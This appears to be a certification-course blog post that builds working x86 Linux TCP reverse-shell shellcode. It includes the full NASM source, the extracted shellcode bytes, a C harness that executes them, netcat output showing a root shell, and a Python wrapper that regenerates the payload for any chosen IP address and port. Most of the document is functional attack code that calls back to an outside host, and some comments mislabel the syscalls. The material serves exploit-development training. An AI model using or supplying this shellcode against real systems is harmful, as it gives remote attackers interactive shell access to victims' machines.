---
title: SLAE32 Assignment 2 - TCP Reverse-Shell Shellcode
date: 2019-8-14
layout: single
classes: wide
tags:
  - reverse
  - Shell
  - Assembly
  - SLAE
  - Linux
  - x86
  - Shellcode
--- 
![](/assets/images/SLAE32.png)
```console
This blog post has been created for completing the requirements
 of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
	- Now at: https://www.pentesteracademy.com/course?id=3
SLAE/Student ID: PA-10913
```
## Overview
For our second assignment in the SLAE32 course we were tasks with creating reverse shell, shellcode.  
_What is a reverse shell?_  
A reverse shell is a program that is executed on a victim device, and connects to a remote host. Once the victim connects to the remote host, the victim executes an interactive shell within the connection. Input and Output of the reverse shell program is passed to the remote host, allowing the remote host to execute commands as if they were physically connected to the terminal.  
After writting the first bind shell, shellcode I felt I had a grasp on Assembly, and skipped right into creating the shellcode.  
## Creating the Assembly Shellcode
### 1. Create the Socket.
#### C Function
```c
int socket(int domain, int type, int protocol);
```
#### Our C Function
```c
<socketcall> socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
EAX=0x66     EBX    ECX[0]     ECX[1]      ECX[2]
```  
+ `EAX = 0x66 = 102`
  - System Call `socketcall 102`
+ `EBX = 0x1 = socket()`
  - Value of EBX Register for `socketcall` to create a new socket.
+ `ECX[0] = int domain = AF_INET = PF_INET = 0x2`
  - Finding the value for `PF_INET`.  
```console
cat /usr/src/linux-headers-$(uname -r)/include/linux/net.h
  SOCK_STREAM     = 1
cat /usr/include/i386-linux-gnu/bits/socket.h
  #define AF_INET         PF_INET
  #define PF_INET         2      
```  
  - We see that `AF_INET` is mapped to `PF_INET`
+ `ECX[1] - int type = SOCK_STREAM = 0x1`
+ `ECX[2] = int protocol = 0`

#### Assembly code for the socket() function
```nasm
xor eax, eax  ; Clear EAX Register. EAX = 0x00000000
mov al, 0x66  ; EBX = 0x66 = 102. SYSCAL 102 = socketcall
xor ebx, ebx  ; Clear EBX Register. 
inc ebx	      ; EBX = 0x1 = socket() // Create a socket
xor ecx, ecx  ; Clear ECX Register. 
push ecx      ; ECX[2] = int protocol = 0. Pushes 0x0 onto the stack
push ebx      ; ECX[1] - int type = SOCK_STREAM = 0x1. Pushes 0x1 onto the stack
push byte 0x2 ; ECX[0] - int domain = AF_INET = PF_INET = 0x2. Pushes 0x2 onto the stack
mov ecx, esp  ; Point the ECX Register to the Top of the stack
int 0x80      ; Execute the socket() System Call

xchg esi, eax ; save the "sockfd" generated from the socket above 
```

### 2. Create the Socket Address Struct
#### C Function
```c
struct sockaddr_in {
  sa_family_t    sin_family; /* address family: AF_INET */
  in_port_t      sin_port;   /* port in network byte order */
  struct in_addr sin_addr;   /* internet address */
};
```
#### Our C Function
```c
{ .sin_family = AF_INET, .sin_port = htons(1337), .sin_addr.s_addr = 127.1.1.1 }
           ARG[0]               ARG[1]                       ARG[2]
```
+ `ARG[0] = 0x2`
  - Value for `AF_INET`
+ `ARG[1] = 0x3905`
  - This is for the TCP Port 1337.
+ `ARG[2] = 0x0101017f`
  - `sin_addr.s_addr`: 127.1.1.1 (big endian)

### 3. Bind our Socket Address to the Socket
#### C Function
```c
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
#### Our C Function
```c
<socketcall> bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));  
EAX=0x66     EBX    ECX[0]                   ECX[1]                  ECX[2]
```

+ `ECX[0] = push esi`
  - This is the value we saved from creating the Socket earlier. 
+ `ECX[1] = pointer to the struct on our stack`
+ `ECX[2] = 0x10`
  -  Our Struct of ARG's is now 16 bytes long (`0x10` in Hex). 

#### Assembly Code for the address struct & function bind().
```nasm 
xor eax, eax     ; Clears the eax register
inc ebx
push 0x0101017f  ; ARG[2]. sin_addr.s_addr: 127.1.1.1 (big endian)
push word 0x3905 ; ARG[1]. This is for the TCP Port 1337.
push bx	         ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
mov ecx, esp     ; Point ECX to the top of the stack. This will be used for ECX[1].
push 0x10        ; ECX[2] - socklen_t addrlen // Sizeof sockaddr
push ecx         ; ECX[1] - const struct sockaddr *addr // pointer to sockaddr
push esi         ; ECX[0] - int sockfd 
                 ;          Saved in ESI earlier after creating the socket.
mov ecx, esp     ; Stack is all loaded. 
                 ;   We now need to point ECX to the top of the Stack.
inc ebx          ; Connect() value for the socketcall() SYSCAL
mov al, 0x66     ; socketcall() system call
int 0x80         ; System Call Interrupt 0x80 - Executes bind(). 
```
### 4. Duplicate STDIN, STDOUT, STDERR to the remote Socket. 
#### C Function
```c
int dup2(int oldfd, int newfd);  
```
#### Our C Function            
```c
dup2( clientSocket, 0 ); // STDIN
dup2( clientSocket, 1 ); // STDOUT
dup2( clientSocket, 2 ); // STDERR
EAX       EBX      ECX     
```
#### Finding Value for dup2 systemcall.
```console
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
  #define __NR_dup2  63
```   


#### Assembly Loop to transfer input and output to the remote socket.
```nasm 
xchg ebx, esi     ; This is our socket value returned from our `socket` systemcall.
xor ecx, ecx      ; Clear the ECX Register
dup2loop:
mov al, 0x3f      ; EAX Syscall dup2() for STDIN STDOUT STDERR
int 0x80          ; execute dup2()
inc ecx           ; increase EAX by 1
cmp cl, 0x4       ; compare cl to 4, if it is 4 the flag will be set
jne dup2loop      ; Jumps to the specified location if flag is set
```

### 5. Spawn a bash shell for the remote client
#### Default C Function
```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```  
#### Our C Function
```c
execve("/bin/bash", NULL, NULL);
```
#### Execve Assembly Shellcode
```nasm
xor edx, edx
push edx         ; Push NULL onto the stack 
push 0x68732f2f  ; Push "hs//" onto the stack 
push 0x6e69622f  ; Push "nib/" onto the stack 
mov ebx, esp     ; point ebx to stack
mov al, 0xb      ; execve
xor ecx, ecx
int 0x80         ; execute execve
```

## Complete Assembly Code for TCP Reverse Shell Shellcode

```nasm
; Filename: revTcpSh.asm
; Author: boku
global _start
section .text
_start:

xor eax, eax      ; Clear EAX Register. EAX = 0x00000000
mov al, 0x66      ; EBX = 0x66 = 102. SYSCAL 102 = socketcall
xor ebx, ebx      ; Clear EBX Register. EBX = 0x00000000
inc ebx	          ; EBX = 0x1 = socket() // Create a socket
xor ecx, ecx      ; Clear ECX Register. ECX = 0x00000000
push ecx          ; ECX[2] = int protocol = 0. 
push ebxi         ; ECX[1] - int type = SOCK_STREAM = 0x1. 
push byte 0x2     ; ECX[0] - int domain = AF_INET = PF_INET = 0x2. 
mov ecx, esp      ; Point the ECX Register to the Top of the stack
int 0x80          ; Execute the socket() System Call

xchg esi, eax     ; save the "sockfd" generated from the socket above 

xor eax, eax
inc ebx
push 0x0101017f   ; ARG[2]. sin_addr.s_addr: 127.1.1.1 (big endian)
push word 0x3905  ; ARG[1]. This is for the TCP Port 1337.
push bx           ; ARG[0]. Push the value 2 onto the stack for AF_INET.
mov ecx, esp      ; Now all that is left is to point ECX to the top of the 
                  ;  loaded stack and let it do it's thing.

push 0x10         ; ECX[2] - socklen_t addrlen // Sizeof sockaddr
push ecx          ; ECX[1] - const struct sockaddr *addr 
push esi          ; ECX[0] - int sockfd. Saved in ESI earlier

mov ecx, esp      ; Point ECX to the top of the Stack.
inc ebx	          ; Connect() value for the socketcall() SYSCAL
mov al, 0x66      ; socketcall() system call
int 0x80          ; System Call Interrupt 0x80 - Executes bind(). 
xchg ebx, esi

xor ecx, ecx
dup2loop:
mov al, 0x3f      ; EAX Syscall dup2() for STDIN STDOUT STDERR
int 0x80          ; execute dup2()
inc ecx           ; increase EAX by 1
cmp cl, 0x4       ; compare cl to 4, if it is 4 the flag will be set
jne dup2loop      ; Jumps to the specified location flag is set

xor edx, edx
push edx          ; Push NULL onto the stack 
push 0x68732f2f   ; Push "hs//" onto the stack 
push 0x6e69622f   ; Push "nib/" onto the stack 
mov ebx, esp      ; point ebx to stack
mov al, 0xb       ; execve
xor ecx, ecx
int 0x80          ; execute execve
```

## Compiling & Testing the Assembly Shellcode
### Compile the Shellcode
```console
nasm -f elf32 revTcpSh.asm -o revTcpSh.o
ld revTcpSh.o -o revTcpSh
```

### Testing the reverse shell program
##### Terminal Window 1
```console
./revTcpSh
```
##### Terminal Window 2
```console
nc.traditional -nvlp 1337
listening on [any] 1337 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 36505
id
uid=0(root) gid=0(root) groups=0(root)
```
## Testing if the Shellcode works when used in another program
### Extracting the Shellcode Hex from the compiled binary
```console
./objdump2hex.sh revTcpSh
"\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a\x02\x89"
"\xe1\xcd\x80\x96\x31\xc0\x43\x68\x7f\x01\x01\x01\x66\x68"
"\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0"
"\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9"
"\x04\x75\xf6\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\xcd\x80"
```
### Adding the shellcode to another program
This is the C program we will use to see if our shellcode works while ran in a different host program. After modifying our program, we will compile it. 
```c
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a\x02\x89"
"\xe1\xcd\x80\x96\x31\xc0\x43\x68\x7f\x01\x01\x01\x66\x68"
"\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0"
"\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9"
"\x04\x75\xf6\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\xcd\x80";
main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
### Compile the C program
```console
gcc -fno-stack-protector -z execstack -o shellcode shellcode.c 
```
### Testing if our shellcode works with the program
#### Terminal Window 1
```console
root# ./shellcode 
Shellcode Length:  80
```
#### Terminal Window 2
```console
root# nc.traditional -nvlp 1337
listening on [any] 1337 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 36507
id
uid=0(root) gid=0(root) groups=0(root)
```

# Tcp Reverse Shell Wrapper
+ The purpose of this wrapper is to easily configure the:
  - Destination IP Address of the Reverse Shell
  - Destination TCP Port of the Reverse Shell

#### Python Reverse Shell Wrapper
```python
#!/usr/bin/python
# Filename: revshWrapper.py
# Author:   boku

## TCP Port
# Take users TCP port as input
port = raw_input("Enter TCP Port Number: ")
# Convert input string to an integer
deciPort = int(port)
# Format the integer to Hex Integer
hexPort = "{:02x}".format(deciPort)
# Check the length of the output hex string
hexStrLen = len(hexPort)
# Check if the hex string is even or odd with modulus 2
oddEven = hexStrLen % 2
# if it returns 1 then it's odd. We need to add a leading 0
if oddEven == 1:
    hexPort = "0" + hexPort
# converts the  port number into the correct hex format
tcpPort = "\\x".join(hexPort[i:i+2] for i in range(0,len(hexPort), 2))
print "Your TCP Port in Hex is:","\\x"+tcpPort
nullCheck = deciPort % 256
if nullCheck == 0 :
    print "Your TCP Port contains a Null 0x00."
    print "Try again with a different Port Number."
    exit(0)

## IP Address
# Take users IP Address as input
ipAddrStr = raw_input("Enter IP Address [127.1.1.1]: ")
if ipAddrStr == "" :
        ipAddrStr = "127.1.1.1"
formatIP = ipAddrStr.split('.')
hexIP = '{:02x}{:02x}{:02x}{:02x}'.format(*map(int, formatIP))
# converts the ip address into the correct hex format
ipAddr = "\\x".join(hexIP[i:i+2] for i in range(0,len(hexIP), 2))
print "Your IP Address in Hex is:","\\x"+ipAddr
#print "\\x"+ipAddr   # debugging

## Shellcode
scPart1 = "\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a\x02\x89"
scPart1 += "\xe1\xcd\x80\x96\x31\xc0\x43\x68"
#ipAddr = "\x7f\x01\x01\x01" # IP 127.1.1.1
scPart2 = "\x66\x68" # Push Word
# tcpPort = "\x05\x39" # TCP Port 1337
scPart3 = "\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0"
scPart3 += "\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9"
scPart3 += "\x04\x75\xf6\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
scPart3 += "\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\xcd\x80"

# Initiate the Shellcode variable we will output
shellcode = ""

# Add the first part of the tcp bind shellcode
for x in bytearray(scPart1) :
    shellcode += '\\x'
    shellcode += '%02x' %x
# Add the user input id address to the shellcode
shellcode += "\\x"+ipAddr
# Add the second part of the tcp bind shellcode
for x in bytearray(scPart2) :
    shellcode += '\\x'
    shellcode += '%02x' %x
# Add the user added tcp port to the shellcode
shellcode += "\\x"+tcpPort
# Add the third part of the tcp bind shellcode
for x in bytearray(scPart3) :
    shellcode += '\\x'
    shellcode += '%02x' %x

print "Choose your shellcode export format."
exportFormat = raw_input("[1] = C Format\n[2] = Python Format\n[1]: ")
if exportFormat == "2" :
    formatSC = '"\nshellcode += "'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
    print "[-----------------------Your-Shellcode------------------------]"
    print 'shellcode = "'+formatSC+'"'
else :
    formatSC = '"\n"'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
    print "[----------------Your-Shellcode------------------]"
    print 'unsigned char shellcode[] = \\\n"'+formatSC+'";'
```

#### Generating the Shellcode with the Wrapper
```console
root# python revshWrapper.py
Enter TCP Port Number: 33801
Your TCP Port in Hex is: \x84\x09
Enter IP Address [127.1.1.1]: 172.16.65.138
Your IP Address in Hex is: \xac\x10\x41\x8a
Choose your shellcode export format.
[1] = C Format
[2] = Python Format
[1]: 1
[----------------Your-Shellcode------------------]
unsigned char shellcode[] = \
"\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a"
"\x02\x89\xe1\xcd\x80\x96\x31\xc0\x43\x68\xac\x10"
"\x41\x8a\x66\x68\x84\x09\x66\x53\x89\xe1\x6a\x10"
"\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x87\xde\x31"
"\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31"
"\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\xb0\x0b\x31\xc9\xcd\x80";
```

### Adding the Shellcode to the Host C Program
```c
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a"
"\x02\x89\xe1\xcd\x80\x96\x31\xc0\x43\x68\xac\x10"
"\x41\x8a\x66\x68\x84\x09\x66\x53\x89\xe1\x6a\x10"
"\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x87\xde\x31"
"\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31"
"\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\xb0\x0b\x31\xc9\xcd\x80";
main()
{
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
```

#### Compiling the Host C Program
```console
root# gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
```

### Testing the Shellcode
#### Window 1
```console
root# ./shellcode
Shellcode Length:  80
```

#### Window 2
```console
root# nc.traditional -v -l -s 172.16.65.138 -p 33801
listening on [172.16.65.138] 33801 ...
connect to [172.16.65.138] from ubuntu.local [172.16.65.138] 58352
id
uid=0(root) gid=0(root) groups=0(root)

```
+ Recieved reverse shell on listener

